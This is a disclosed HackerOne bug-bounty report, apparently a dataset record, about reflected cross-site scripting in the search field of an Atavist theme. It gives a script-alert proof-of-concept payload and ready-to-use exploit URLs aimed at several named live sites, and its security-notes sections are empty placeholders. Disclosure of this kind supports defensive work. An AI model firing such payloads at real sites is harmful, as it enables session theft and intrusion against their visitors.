---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '947790'
original_report_id: '947790'
title: Reflected XSS on a Atavist theme
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: automattic
created_at: '2020-07-30T11:46:14.695Z'
disclosed_at: '2020-11-18T14:22:13.129Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on a Atavist theme

## Metadata

- HackerOne Report ID: 947790
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: automattic
- Disclosed At: 2020-11-18T14:22:13.129Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi team,
I found Reflected XSS at a Atavist theme and there are a lot of affected websites.
I don't know the theme's name but it's in use at https://magazine.atavist.com/
Just write `<script>alert(document.domain)</script>` to  search field.

https://magazine.atavist.com/search?search=%3Cscript%3Ealert(document.domain)%3C/script%3E
https://docs.atavist.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

Also there are more affected websites like http://www.377union.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E , http://www.lifeaftermaria.org/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E etc.

So, I think the scope of this vulnerability is very large.

## Impact

Reflected XSS

Thanks,
Bugra

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
